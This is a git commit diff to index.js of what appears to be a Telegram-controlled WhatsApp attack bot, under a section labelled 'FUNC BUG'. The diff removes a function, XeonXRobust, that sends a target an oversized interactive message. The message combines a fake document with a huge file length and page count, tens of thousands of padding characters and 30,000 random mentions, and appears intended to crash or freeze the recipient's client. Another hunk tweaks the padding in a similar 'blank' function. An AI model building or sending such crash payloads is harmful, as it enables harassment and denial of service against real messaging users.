d49542656e0f8510d28958458868e370be238599
kingranzz <156513688+kingranzz@users.noreply.github.com>
2025-02-09 08:03:00 +0800

    Add files via upload

--- index.js
+++ index.js
@@ -2187,79 +2187,6 @@ bot.action("option1", async (ctx) => {
 
 //===============FUNC BUG==================\\
 // [ BUG FUNCTION ]
-async function XeonXRobust(sock, target);     {
-  const jids = `_*~@0~*_\n`.repeat(10200);
-  const ui = "ㅤ".repeat(10000);
-  await sock.relayMessage(target, {
-    ephemeralMessage: {
-      message: {
-        interactiveMessage: {
-          header: {
-            documentMessage: {
-              url: "https://mmg.whatsapp.net/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0&mms3=true",
-              mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
-              fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
-              fileLength: "9999999999999",
-              pageCount: 1316134911,
-              mediaKey: "45P/d5blzDp2homSAvn86AaCzacZvOBYKO8RDkx5Zec=",
-              fileName: "I Love You:)❤️",
-              fileEncSha256: "LEodIdRH8WvgW6mHqzmPd+3zSR61fXJQMjf3zODnHVo=",
-              directPath: "/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0",
-              mediaKeyTimestamp: "1726867151",
-              contactVcard: true,
-              jpegThumbnail: "https://files.catbox.moe/m33kq5.jpg"
-            },
-            hasMediaAttachment: true
-          },
-          body: {
-            text: "ㅤㅤㅤㅤㅤㅤ" + ui + jids
-          },
-          contextInfo: {
-            mentionedJid: ["0@s.whatsapp.net"],
-            mentions: ["0@s.whatsapp.net"]
-          },
-          footer: {
-            text: ""
-          },
-          nativeFlowMessage: {},
-          contextInfo: {
-            mentionedJid: ["0@s.whatsapp.net", ...Array.from({
-              length: 30000
-            }, () => "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net")],
-            forwardingScore: 1,
-            isForwarded: true,
-            fromMe: false,
-            participant: "0@s.whatsapp.net",
-            remoteJid: "status@broadcast",
-            quotedMessage: {
-              documentMessage: {
-                url: "https://mmg.whatsapp.net/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
-                mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
-                fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
-                fileLength: "9999999999999",
-                pageCount: 1316134911,
-                mediaKey: "lCSc0f3rQVHwMkB90Fbjsk1gvO+taO4DuF+kBUgjvRw=",
-                fileName: "Yea? ThanksYou!",
-                fileEncSha256: "wAzguXhFkO0y1XQQhFUI0FJhmT8q7EDwPggNb89u+e4=",
-                directPath: "/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
-                mediaKeyTimestamp: "1724474503",
-                contactVcard: true,
-                thumbnailDirectPath: "/v/t62.36145-24/13758177_1552850538971632_7230726434856150882_n.enc?ccb=11-4&oh=01_Q5AaIBZON6q7TQCUurtjMJBeCAHO6qa0r7rHVON2uSP6B-2l&oe=669E4877&_nc_sid=5e03e0",
-                thumbnailSha256: "njX6H6/YF1rowHI+mwrJTuZsw0n4F/57NaWVcs85s6Y=",
-                thumbnailEncSha256: "gBrSXxsWEaJtJw4fweauzivgNm2/zdnJ9u1hZTxLrhE=",
-                jpegThumbnail: ""
-              }
-            }
-          }
-        }
-      }
-    }
-  }, Ptcp ? {
-    participant: {
-      jid: target
-    }
-  } : {});
-}
 async function click(sock, target) {
   let msg = await generateWAMessageFromContent(
     sock,
@@ -2970,7 +2897,7 @@ async function TagNull(sock, target) {
 
 async function blank(sock, target) {
   const jids = `_*~@8~*_\n`.repeat(10500);
-  const ui = "ꦽ".repeat(55555);
+  const ui = "ㅤ".repeat(55555);
 
   await sock.relayMessage(
     target,
